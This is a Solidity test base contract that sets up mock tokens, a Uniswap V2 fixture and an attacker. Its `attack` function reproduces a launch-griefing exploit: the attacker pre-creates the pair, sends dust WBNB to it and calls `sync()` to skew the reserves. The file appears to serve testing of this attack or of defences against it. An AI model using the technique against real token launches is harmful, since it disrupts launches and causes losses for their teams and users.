// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {MockERC20} from "../mocks/MockERC20.sol";
import {ITestFactory, ITestPair, ITestRouter, UniswapV2Fixture} from "./UniswapV2.sol";

/// @notice Common setup: a new token (NEW), a quote token (WBNB), Uniswap V2, the team and an attacker.
abstract contract BaseV2Test is UniswapV2Fixture {
    /// @dev The team wants to launch NEW at 1 NEW = 0.37 WBNB.
    uint256 internal constant AMOUNT_NEW = 1_000e18;
    uint256 internal constant AMOUNT_WBNB = 370e18;

    MockERC20 internal newToken;
    MockERC20 internal wbnb;
    ITestFactory internal factory;
    ITestRouter internal router;

    address internal team = makeAddr("team");
    address internal attacker = makeAddr("attacker");

    function setUp() public virtual {
        newToken = new MockERC20("New Token", "NEW");
        wbnb = new MockERC20("Wrapped BNB", "WBNB");
        (factory, router) = deployUniswapV2(address(wbnb));

        // Before the launch only the team holds NEW. Anyone can get WBNB.
        newToken.mint(team, 1_000_000e18);
        wbnb.mint(team, 1_000e18);
        wbnb.mint(attacker, 1_000e18);
    }

    /// @dev The attack: create the pair, send `dust` WBNB to it and call `sync()`. Reserves become (0 NEW, dust WBNB).
    function attack(uint256 dust) internal returns (ITestPair pair) {
        vm.startPrank(attacker);
        pair = ITestPair(factory.createPair(address(newToken), address(wbnb)));
        wbnb.transfer(address(pair), dust);
        pair.sync();
        vm.stopPrank();
    }

    /// @dev Pair reserves as (NEW, WBNB).
    function reserves(ITestPair pair) internal view returns (uint256 reserveNew, uint256 reserveWbnb) {
        return reservesOf(pair, address(newToken));
    }

    function pairOf() internal view returns (ITestPair) {
        return ITestPair(factory.getPair(address(newToken), address(wbnb)));
    }
}
